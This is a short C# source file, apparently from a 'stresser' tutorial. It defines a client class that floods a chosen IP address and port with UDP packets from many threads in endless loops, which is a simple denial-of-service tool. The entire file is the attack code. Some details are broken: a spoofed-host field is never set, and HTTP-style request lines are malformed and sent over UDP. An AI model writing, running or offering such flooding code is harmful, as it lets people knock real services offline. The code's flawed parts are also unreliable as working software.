using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace StresserClientTutorial
{
    public class Client
    {
        private Byte[] packet1;
        private Byte[] packet2;

        public readonly string ip;
        public readonly int port;
        public readonly string fakeIp;

        private bool run = true;

        public Client(string ip, int port)
        {
            this.ip = ip;
            this.port = port;
            this.packet1 = Encoding.ASCII.GetBytes("GET /" + ip + "HTTP/1.1\r\n");
            this.packet2 = Encoding.ASCII.GetBytes("Host: " + fakeIp + "\r\n\r\n");
        }

        public Client() { }


        public void Send()
        {
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), port);

            Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            client.Connect(endPoint);
            client.SendTo(packet1, endPoint);
            client.SendTo(packet2, endPoint);

            //client.Close();
        }

        public void Stop()
        {
            run = false;
        }

        public void Attack(int threads)
        {
            for (int i = 0; i<threads; i++)
            {

                new Thread(() =>
                {
                    while (run)
                    {
                        try
                        {
                            Send();
                            Console.WriteLine("Thread has sent packet data");
                        }
                        catch (System.Net.Sockets.SocketException)
                        {
                            Console.WriteLine("Thread unable to attack");
                        }
                    }

                    Console.WriteLine("Program stopped");

                    return;


                }).Start();

            }
        }
    }
}
